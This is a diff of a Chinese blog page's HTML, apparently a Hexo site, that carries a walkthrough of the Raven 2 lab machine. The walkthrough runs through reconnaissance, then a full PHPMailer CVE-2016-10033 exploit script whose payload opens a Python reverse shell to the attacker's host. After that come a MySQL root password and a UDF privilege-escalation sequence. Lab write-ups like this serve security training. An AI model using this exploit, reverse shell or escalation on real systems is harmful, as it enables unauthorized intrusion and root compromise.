@@ -580,21 +580,6 @@
         
  <!-- prismjs 代码高亮 -->
  
-    
-    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
-    
-        <link href="/js/prism/prism-coy.min.css" rel="stylesheet">
-    
-
-    <style>
-        pre[class*="language-"] {
-            overflow-y: hidden;
-        }
-        .line-numbers .line-numbers-rows {
-            border: none;
-        }
-    </style>
-  
 
 
 <div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
@@ -665,25 +650,25 @@
 <h3 id="RAVEN-2靶机"><a href="#RAVEN-2靶机" class="headerlink" title="RAVEN 2靶机"></a>RAVEN 2靶机</h3><h3 id="（1）信息收集"><a href="#（1）信息收集" class="headerlink" title="（1）信息收集"></a>（1）信息收集</h3><ul>
 <li>通过netdiscover进行二层发现，发现地址为192.168.101.134主机</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.101.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.101.0/24</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102437077.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102437077.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ul>
 <li>通过ping进行三层发现，根据ttl&#x3D;64初步推测该主机为Linux</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token number">192.168</span>.101.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.134</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102542459.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102542459.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ul>
 <li>通过masscan四层发现目标主机开放端口</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan -p0-65535 <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token number">192.168</span>.101.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.134</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102724962.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102724962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>目标主机开启了111服务端口，22ssh端口，49505端口</p>
 <ul>
 <li><p>扫描目标端口服务</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-sC</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sS</span> <span class="token parameter variable">-P0</span> <span class="token number">192.168</span>.101.134 <span class="token parameter variable">-oN</span> nmap.A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.134 -oN nmap.A</span><br></pre></td></tr></table></figure></li>
 </ul>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102846814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102846814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ul>
@@ -695,7 +680,7 @@
 </li>
 </ul>
 <p>使用Nmap中漏洞分类NSE脚本对目标进行探测</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> vuln <span class="token number">192.168</span>.101.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.134</span><br></pre></td></tr></table></figure>
 
 <hr>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626103151599.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626103151599.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
@@ -715,7 +700,7 @@
 <ul>
 <li>目录扫描：</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb <span class="token number">192.168</span>.101.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 192.168.101.135</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>目标网站存在vendor目录，访问一下，发现存在敏感目录遍历</p>
@@ -732,19 +717,19 @@
 <p>VERSION目录找到了PHPMailer版本号为5.2.16</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h3 id="（2）PHPMailer漏洞攻击"><a href="#（2）PHPMailer漏洞攻击" class="headerlink" title="（2）PHPMailer漏洞攻击"></a>（2）PHPMailer漏洞攻击</h3><p>查找对应的漏洞：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit PHPMailer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit PHPMailer</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145538957.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145538957.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>PHPMaileer&lt;5.2.18可以进行远程代码执行，使用python版对应的exp：</p>
 <ul>
 <li>把exp复制到当前目录：</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/php/webapps/40974.py ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/php/webapps/40974.py ./</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>攻击机kali开启nc监听，端口为4444</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4444</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>修改exp，把target改为目标地址，backdoor为写的shell地址，修改反弹shell地址为本机ip，修改后如下：</li>
@@ -752,48 +737,7 @@
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192523424.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192523424.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>之所以加contact.php，可以看一下该漏洞成因，是因为输入的邮件地址能包含引号括起来的空格，造成参数注入。所以要找接收邮件参数的页面。就是contact.php</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192319281.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628192319281.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> requests_toolbelt <span class="token keyword">import</span> MultipartEncoder
-<span class="token keyword">import</span> requests
-<span class="token keyword">import</span> os
-<span class="token keyword">import</span> base64
-<span class="token keyword">from</span> lxml <span class="token keyword">import</span> html <span class="token keyword">as</span> lh
-
-os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'clear'</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ "</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski\n"</span><span class="token punctuation">)</span>
-
-target <span class="token operator">=</span> <span class="token string">'http://192.168.101.134:80/contact.php'</span><span class="token comment">#存在漏洞的目标</span>
-backdoor <span class="token operator">=</span> <span class="token string">'/godown.php'</span><span class="token comment">#后门位置</span>
-
-payload <span class="token operator">=</span> <span class="token string">'&lt;?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.101.128\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'</span><span class="token comment">#connect到kali ip</span>
-fields<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'action'</span><span class="token punctuation">:</span> <span class="token string">'submit'</span><span class="token punctuation">,</span>
-        <span class="token string">'name'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
-        <span class="token string">'email'</span><span class="token punctuation">:</span> <span class="token string">'"anarcoder\\\" -OQueueDirectory=/tmp -X/var/www/html/godown.php server\" @protonmail.com'</span><span class="token punctuation">,</span>
-        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Pwned'</span><span class="token punctuation">&#125;</span><span class="token comment">#OQueueDirectory同步改为shell地址</span>
-
-m <span class="token operator">=</span> MultipartEncoder<span class="token punctuation">(</span>fields<span class="token operator">=</span>fields<span class="token punctuation">,</span>
-                     boundary<span class="token operator">=</span><span class="token string">'----WebKitFormBoundaryzXJpHSq4mNy35tHe'</span><span class="token punctuation">)</span>
-
-headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'curl/7.47.0'</span><span class="token punctuation">,</span>
-         <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> m<span class="token punctuation">.</span>content_type<span class="token punctuation">&#125;</span>
-
-proxies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">'localhost:8081'</span><span class="token punctuation">,</span> <span class="token string">'https'</span><span class="token punctuation">:</span><span class="token string">'localhost:8081'</span><span class="token punctuation">&#125;</span>
-
-
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] SeNdiNG eVIl SHeLL To TaRGeT....'</span><span class="token punctuation">)</span>
-r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> data<span class="token operator">=</span>m<span class="token punctuation">.</span>to_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-                  headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D'</span><span class="token punctuation">)</span>
-r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token operator">+</span>backdoor<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-<span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]  ExPLoITeD '</span> <span class="token operator">+</span> target<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests_toolbelt <span class="keyword">import</span> MultipartEncoder</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html <span class="keyword">as</span> lh</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://192.168.101.134:80/contact.php&#x27;</span><span class="comment">#存在漏洞的目标</span></span><br><span class="line">backdoor = <span class="string">&#x27;/godown.php&#x27;</span><span class="comment">#后门位置</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.101.128\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><span class="comment">#connect到kali ip</span></span><br><span class="line">fields=&#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/godown.php server\&quot; @protonmail.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Pwned&#x27;</span>&#125;<span class="comment">#OQueueDirectory同步改为shell地址</span></span><br><span class="line"></span><br><span class="line">m = MultipartEncoder(fields=fields,</span><br><span class="line">                     boundary=<span class="string">&#x27;----WebKitFormBoundaryzXJpHSq4mNy35tHe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;curl/7.47.0&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Content-Type&#x27;</span>: m.content_type&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;localhost:8081&#x27;</span>, <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;localhost:8081&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] SeNdiNG eVIl SHeLL To TaRGeT....&#x27;</span>)</span><br><span class="line">r = requests.post(target, data=m.to_string(),</span><br><span class="line">                  headers=headers)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D&#x27;</span>)</span><br><span class="line">r = requests.get(target+backdoor, headers=headers)</span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]  ExPLoITeD &#x27;</span> + target)</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>提一些其他的知识：vim全选复制：vVGy</p>
@@ -811,11 +755,11 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 <ul>
 <li>用python pty获取完整交互式shell</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193203637.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628193203637.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>查找flag2，flag3:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> flag* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag* 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>加上<code>2&gt;/dev/null</code>把错误输出丢弃，不然会出现暴多Permission denied的无权限搜索目录信息。</p>
@@ -830,7 +774,7 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194359329.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194359329.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>数据库账号root，密码R@v3nSecurity</p>
 <p>登录mysql:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-u</span> root -pR@v3nSecurity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -pR@v3nSecurity</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194517437.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628194517437.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>且Server version(Mysql)版本为5.5.60。可以用udf提权</p>
@@ -842,13 +786,11 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 </ul>
 </blockquote>
 <p>查找对应的exp：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mysql</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628200305919.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628200305919.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>把exp复制到当前路径，并gcc编译</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/1518.c ./
-gcc <span class="token parameter variable">-g</span> <span class="token parameter variable">-c</span> <span class="token number">1518</span>.c
-gcc <span class="token parameter variable">-g</span> <span class="token parameter variable">-shared</span> <span class="token parameter variable">-o</span>  raptor_udf.so <span class="token number">1518</span>.o <span class="token parameter variable">-lc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/1518.c ./</span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o  raptor_udf.so 1518.o -lc</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>gcc各个参数说明：</p>
@@ -858,34 +800,25 @@ gcc <span class="token parameter variable">-g</span> <span class="token paramete
 <p>-lc 连接c标准库，提供标准C库函数支持</p>
 </blockquote>
 <p>在kali上起一个web服务，在靶机上下载so</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token number">8888</span>
-或者
-python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br><span class="line">或者</span><br><span class="line">python2 -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure>
 
 <p>靶机执行：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.101.128:8888/raptor_udf.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.101.128:8888/raptor_udf.so</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201426533.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201426533.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201724809.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230628201724809.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>进入数据库mysql创建数据表foo，向表中插入二进制数据，利用dumpfile函数把文件以root权限写到plugin目录，新建返回类型为整型的函数do_system，别名soname（注意修改load_file的so路径）</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> mysql<span class="token punctuation">;</span>
-<span class="token keyword">create</span> <span class="token keyword">table</span> foo<span class="token punctuation">(</span>line <span class="token keyword">blob</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">insert</span> <span class="token keyword">into</span> foo <span class="token keyword">values</span><span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'/var/www/html/raptor_udf1.so'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> foo <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'/usr/lib/raptor_udf2.so'</span><span class="token punctuation">;</span>
-<span class="token keyword">create</span> <span class="token keyword">function</span> do_system <span class="token keyword">returns</span> <span class="token keyword">integer</span> <span class="token keyword">soname</span> <span class="token string">'raptor_udf2.so'</span><span class="token punctuation">;</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> foo <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'/usr/lib/mysql/plugin/raptor_udf2.so'</span><span class="token punctuation">;</span>
-<span class="token keyword">create</span> <span class="token keyword">function</span> do_system <span class="token keyword">returns</span> <span class="token keyword">integer</span> <span class="token keyword">soname</span> <span class="token string">'raptor_udf.so'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
